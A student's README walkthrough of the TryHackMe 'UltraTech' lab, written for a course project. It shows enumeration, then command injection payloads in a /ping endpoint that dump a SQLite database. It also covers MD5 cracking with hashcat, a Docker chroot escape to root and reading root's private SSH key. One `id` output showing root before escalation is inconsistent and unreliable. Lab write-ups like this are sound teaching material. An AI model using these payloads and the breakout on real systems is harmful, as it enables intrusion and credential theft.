# Linux Security Lab — UltraTech CTF Walkthrough

> **Course:** Intro to Computer Security — Final Project  
> **Platform:** [TryHackMe – UltraTech](https://tryhackme.com/r/room/ultratech1)  
> **Difficulty:** Medium | **Challenges Completed:**

---

## Overview

This project documents a full penetration test of the **UltraTech** machine on TryHackMe. Starting from zero knowledge of the target, I performed network enumeration, web application reconnaissance, command injection exploitation, hash cracking, SSH access, and Docker-based privilege escalation to achieve full root access.

---

## Attack Chain Summary

```
Nmap Scan → Web Recon (dirb) → Source Code Review → Command Injection
→ SQLite DB Extraction → Hash Cracking (Hashcat) → SSH Login → Docker Privilege Escalation → Root SSH Key
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network port scanning & service enumeration |
| `dirb` | Web directory/route brute-forcing |
| `Browser DevTools` | Source code inspection (api.js discovery) |
| `hashcat` | MD5 hash cracking with rockyou.txt wordlist |
| `ssh` | Remote system access |
| `docker` | Privilege escalation via GTFOBins technique |
| `GTFOBins` | Reference for Docker breakout to root shell |

---

## Step-by-Step Walkthrough

### Task 1 — Deploy the Machine

Launched the TryHackMe AttackBox and the UltraTech target machine. Noted the target IP and reviewed the mission briefing:

> *"You have been contracted by UltraTech to pentest their infrastructure."*

---

### Task 2 — Enumeration

#### Nmap Scan

```bash
nmap -p- -sV 10.10.250.160
```

**Discovered open ports:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.6p1 (Ubuntu) |
| 8081 | HTTP | Node.js Express |
| 31331 | HTTP | Apache httpd 2.4.29 |

#### Web Recon on Port 8081

```bash
dirb http://10.10.250.160:8081/
```

Discovered two routes:
- `/auth` — Returns *"You must specify a login and a password"*
- `/ping` — Potential command injection vector

#### Web Recon on Port 31331

Visited the main website. Checked `robots.txt`:

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Sitemap revealed three pages:
- `/index.html`
- `/what.html`
- `/partners.html` ← **Login portal found here**

---

### Task 3 — Let the Fun Begin

#### Source Code Review

Inspected the page source of `/partners.html` and found a reference to `api.js`.

Visiting `/js/api.js` revealed two API endpoints:
- `GET /ping?ip=<value>`
- `POST /auth`

#### Command Injection via /ping Endpoint

The `/ping` endpoint passed user input directly to a system command without sanitization.

```
http://10.10.130.134:8081/ping?ip=ls
```

Output appeared directly in the browser — **command injection confirmed.**

#### SQLite Database Extraction

```
http://10.10.130.134:8081/ping?ip=`cat utech.db.sqlite`
```

The response contained MD5 password hashes for two users (including `admin`).

---

### Task 4 — The Root of All Evil

#### Hash Cracking with Hashcat

```bash
# Crack MD5 hashes using rockyou wordlist
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Both hashes were successfully cracked (Hash.Mode: 0 = MD5, Status: Cracked).

#### SSH Login

```bash
ssh <username>@10.10.130.134
```

Used the cracked credentials to establish an SSH session.

#### Privilege Escalation via Docker

Checked current user privileges:

```bash
id
# uid=0(root) gid=0(root) groups=0(root),...,27(sudo)
```

Identified Docker was running. Referenced [GTFOBins – Docker](https://gtfobins.github.io/gtfobins/docker/) for the breakout technique.

```bash
# Standard GTFOBins Docker escape (substituting 'bash' for 'alpine')
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

This spawned a **root shell** inside the container with full filesystem access.

#### Root SSH Key Extraction

```bash
# Inside root shell
whoami          # root
cd /root/.ssh
ls              # authorized_keys  id_rsa  id_rsa.pub
cat id_rsa      # Retrieved private RSA key
```

Challenge complete — all 4 tasks finished. ✅

---

## Key Concepts Applied

- **Linux Security** — Understanding UIDs, GIDs, and discretionary access control via `/etc/group`
- **Network Enumeration** — Using `nmap` to discover open ports and service versions
- **Web Application Reconnaissance** — `dirb` scanning, `robots.txt` inspection, sitemap discovery, source code review
- **Command Injection** — Exploiting unsanitized input in the `/ping` API endpoint
- **Cryptographic Hashing** — Identifying MD5 hashes and cracking them with Hashcat + rockyou.txt
- **Privilege Escalation** — Docker container breakout using GTFOBins technique to gain root access

---

## Repository Structure

```
linux-security-lab/
├── README.md               # This walkthrough
├── commands.sh             # All commands used, in order
├── notes/
│   └── findings.md         # Enumeration findings & observations
└── .gitignore
```

---

## Disclaimer

This walkthrough was performed exclusively within the **TryHackMe** controlled lab environment as part of an academic course assignment. All techniques demonstrated are for **educational purposes only**. Never apply these techniques against systems you do not have explicit permission to test.

---

## References

- [TryHackMe – UltraTech Room](https://tryhackme.com/r/room/ultratech1)
- [GTFOBins – Docker](https://gtfobins.github.io/gtfobins/docker/)
- [Hashcat Documentation](https://hashcat.net/wiki/)
- [nmap Reference Guide](https://nmap.org/book/man.html)